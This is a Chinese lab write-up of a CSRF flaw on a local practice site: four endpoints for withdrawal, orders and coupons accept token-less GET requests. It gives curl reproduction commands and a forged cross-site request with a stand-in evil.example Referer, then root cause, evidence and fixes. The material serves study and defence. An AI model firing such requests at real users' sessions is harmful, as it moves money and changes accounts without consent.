# 漏洞笔记：业务接口漏接 CSRF 校验且不限制 HTTP 方法（顶级 GET 导航即改状态）

- **编号**：VER-02（来源 HUNT-02，t5 判定 confirmed）
- **靶场**：target-site-lab `http://127.0.0.1:8095`（本机授权练习环境）
- **危害等级**：中危（Medium）
- **CWE/OWASP**：CWE-352（Cross-Site Request Forgery）＋ CWE-650（Trusting HTTP Permission Methods on the Server Side）；OWASP Top 10 2021 **A01:2021 Broken Access Control**
- **CVSS-like**：6.5（AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L）
- **复现率**：4/4 端点各 1 次全部 200 且库内可见
- **代码位置**：`target-site-lab/app.py:1057`（`wallet_withdraw`）、`:921`（`order_create`）、`:974`（`order_status`）、`:1015`（`coupon_claim`）、`:608`（钱包页表单写成 `method="get"`）

---

## 1. 漏洞概述

容器里有四个会改状态的业务入口**完全不调用 `verify_csrf`**，也**不判断 `self.command`**：不带任何 `csrf_token` 的顶级 GET 导航就能真实扣款、建单、改订单状态、领券。攻击者只需让受害者在登录态下打开一个 URL（`<img>`、`window.open`、`location=`、表单 GET 均可），资金与业务状态即被改动。

本站并非没有 CSRF 机制——`/wallet/transfer`（`app.py:1104`）与 `/change-password` 无 token 时稳定 403。**问题是这四个入口漏接**，属于典型的"防线建了但没覆盖全"。

**表述修正（t5 强制）**：`SameSite=Lax` 会拦跨站 POST 与子资源请求，所以攻击链必须走**顶级 GET 导航**；带 `Sec-Fetch-Site: cross-site` 的同会话 GET 仍返回 200，证明这条链路成立。

---

## 2. 原理（代码层根因）

| 端点 | 处理函数 | 是否校验 CSRF | 是否限制方法 | 实测无 token 结果 |
|---|---|---|---|---|
| `GET|POST /wallet/withdraw` | `app.py:1057-1092`（`form()` 在 1058） | ❌ | ❌ | 200 提现成功 |
| `GET|POST /order/create` | `app.py:921-969`（`form()` 在 922） | ❌ | ❌ | 200 下单成功 |
| `GET|POST /order/status` | `app.py:974-1010`（`form()` 在 975） | ❌ | ❌ | 200 改单成功 |
| `GET|POST /coupon/claim` | `app.py:1015-1052`（`form()` 在 1016） | ❌ | ❌ | 200 领券 +1000 |

两个叠加的成因：

1. **CSRF 校验是"逐端点手写"而非全局中间件**。`verify_csrf`（`app.py:364-368`）只被 `wallet_transfer`、`change_password` 显式调用，任何人新增/改动路由时忘记调用即产生空洞。
2. **参数取值统一走 `form()`（`app.py:336-347`）**，它把 query 与 body 合并（`data.update(q)`，L346），方法不再影响参数来源——GET 与 POST 同权。钱包页自己给出的表单就是 `method="get"`（`app.py:608`），把"GET 也能改状态"写进了设计。

服务端也没有任何 `Origin` / `Referer` / `Sec-Fetch-*` 校验，cookie 又没有额外收紧，因此跨站顶级导航即可携带会话。

---

## 3. 可复现 payload

前置条件：靶场 8095 在跑；`alice/alice123` 可用（种子余额 88800 分）；订单 2 属主为 alice，当前 `unpaid`。

```bash
# ① 登录 alice 拿会话
curl.exe -s -c C:\temp\t5jar2 -d "username=alice&password=alice123" \
  http://127.0.0.1:8095/login

# ② 无 CSRF token，纯 GET 提现 700 分 → 200 提现成功
curl.exe -s -i -b C:\temp\t5jar2 "http://127.0.0.1:8095/wallet/withdraw?amount=700"

# ③ 无 CSRF token，POST 下单（也可改用 GET + query） → 200 下单成功
curl.exe -s -i -b C:\temp\t5jar2 -d "product_id=1&qty=1" \
  http://127.0.0.1:8095/order/create

# ④ 无 CSRF token，GET 推进订单状态 unpaid→paid → 200 改单成功
curl.exe -s -i -b C:\temp\t5jar2 \
  "http://127.0.0.1:8095/order/status?order_id=2&state=paid"

# ⑤ 无 CSRF token，GET 领券 → 200 领券 +1000
curl.exe -s -i -b C:\temp\t5jar2 "http://127.0.0.1:8095/coupon/claim?code=WELCOME10"
```

带跨站语义头的原始请求（证明服务端不看来源）：

```http
GET /wallet/withdraw?amount=700 HTTP/1.1
Host: 127.0.0.1:8095
Cookie: token=<alice 会话>
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Referer: http://evil.example/csrf.html
```

→ 响应 200，余额实际减少（服务端对 `Sec-Fetch-Site: cross-site` 与伪造 `Referer` 无任何反应）。

---

## 4. 复现步骤与证据

| 观测项 | 改前 | 改后（实测） |
|---|---|---|
| `alice.balance_cents` | 88800 | **87100**（提现 700 + 下单 29900 − 领券 1000，逐笔库内可见） |
| `orders.id=2.state` | `unpaid` | **`paid`** |
| `coupon_claims` 行数 | 0 | **1** |
| 新增订单 | — | 无线鼠标 ×1 = 29900 分 |

同源对照（证明本站确实存在 CSRF 机制，只是没覆盖）：

```bash
curl.exe -s -o NUL -w "%{http_code}\n" -b C:\temp\t5jar2 \
  -d "to=bob&amount=100" http://127.0.0.1:8095/wallet/transfer    # 403 CSRF 校验失败
```

会话 Cookie 属性（`app.py:306-307` 实测下发）：`token=<值>; Path=/; HttpOnly; SameSite=Lax` ——`SameSite=Lax` 会拦跨站 POST 与子资源请求，**不拦顶级 GET 导航**，所以本项的利用路径限定为顶级 GET。

原始证据文件：

- `security/learning/_evidence/verify-02-logic-session-20261012-1855.json`（sha256 `1b7b154509e9a95157fbd67b78a22289798a0d0383af802c48f8007a5a74cd5c`）——四个端点的原始请求/响应与库内前后值
- `security/learning/_evidence/verified-20261012-184800.json`（VER-02 条目：raw_request / repro_cmd / harm_proof / correction）
- `security/learning/_evidence/hunt-a-bizlogic-20261012-1830.json`——挖掘阶段业务逻辑类原始包
- 源码比对：`target-site-lab/app.py` 第 921/974/1015/1057 行（sha256 `d2992cd0f4832b9e67baccb04163700d567f57b4ada437e661017d015721b484`）

回滚：`GET /__reset`；收集时点（2026-10-12T18:48+08:00 复核）`lab.db` sha256 `49b2032c29f8057530704203fd361bb162461eaeeeeb874c7ac1b8e8956cc7af`，`integrity_check=ok`。

---

## 5. 修复方案

### 代码级（P0）

在 `app.py` 中给四个入口头部加统一校验（顺序放在 `require_user` 之后）：

```python
def order_create(self):
    path, form = self.form()
    conn = get_db()
    try:
        user = self.require_user(conn)
        if not user:
            return
        if self.command != "POST":                       # 新增：只允许 POST
            self.html(405, page("405", "<h1>方法不允许</h1>"))
            return
        if not self.verify_csrf(form.get("csrf_token", "")):   # 新增：CSRF 校验
            self.html(403, page("CSRF 校验失败",
                "<h1>请求被拒绝</h1><p>CSRF token 无效或缺失。</p>",
                user["username"]))
            return
        ...
```

四个函数逐一同款处理；同时把 `app.py:608` 的钱包页表单从 `method="get"` 改成 `method="post"`，并在表单里带上 `<input type="hidden" name="csrf_token" value="{csrf}">`（`/change-password` 表单 `app.py:605` 已有现成写法可直接抄）。

更稳的做法是**把校验从"逐端点"改成"框架级"**：在 `route()` 分发表之外维护一张敏感端点白名单，凡命中白名单的请求在进入 handler 前强制 `POST + verify_csrf`，避免以后再漏。

### 纵深防御

- **Cookie 属性**：会话 Cookie 加 `SameSite=Strict`（或 `Lax` 之外再叠 `HttpOnly`、`Secure`），收紧跨站携带面；`SameSite` 是纵深防御，**不能替代 token 校验**。
- **来源校验**：校验 `Origin`/`Referer` 是否属于本站白名单，`Sec-Fetch-Site` 为 `cross-site` 时对敏感操作直接拒绝。
- **敏感操作二次确认**：提现/转账要求重新输入口令或 TOTP。
- **回归用例**：把"不带 token 的 GET/POST 打敏感端点必须 4xx"写进自动化回归，防止新端点再漏。

---

## 6. 参考链接

- OWASP CSRF Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- CWE-352: Cross-Site Request Forgery (CSRF)：https://cwe.mitre.org/data/definitions/352.html
- CWE-650: Trusting HTTP Permission Methods on the Server Side：https://cwe.mitre.org/data/definitions/650.html
- MDN：Set-Cookie `SameSite` 语义：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- MDN：`Sec-Fetch-Site` 请求头：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site

---

## 7. 学习要点

- **考什么思路**：CSRF 防护要按"**所有会改状态的端点**"清点，而不是看到某个表单有 token 就认为站点安全。清点方法：拉全部路由 → 逐个判定 ①是否改状态 ②是否校验 token ③是否限制方法。
- **为什么 GET 更危险**：`SameSite=Lax` 与多数浏览器默认策略允许**顶级 GET 导航**携带 Cookie，POST 则被拦。所以"用 GET 干写操作"是把 CSRF 防护削掉一层，属于 CWE-650。
- **同类变体**：
  - GET 版删/改/审批接口（`/user/delete?id=`、`/order/cancel?id=`）。
  - JSON API 用 `Content-Type: text/plain` 绕过预检型 CSRF（CORS 预检被绕过）。
  - 只校验 `Referer` 存在性、不校验值的实现。
  - CSRF token 与会话解绑（同一 token 可用于任何会话）——本站 VER-03 就是 token 由 SECRET_KEY 派生导致可伪造，属"有 token 但不可信"的变体。
- **取证的坑**：测 CSRF 一定要带上 `Sec-Fetch-*` 或伪造 `Origin/Referer` 再打一次，只有这样才能区分"服务端不看来源"与"服务端看了但没拦住"；本案例两者都成立。
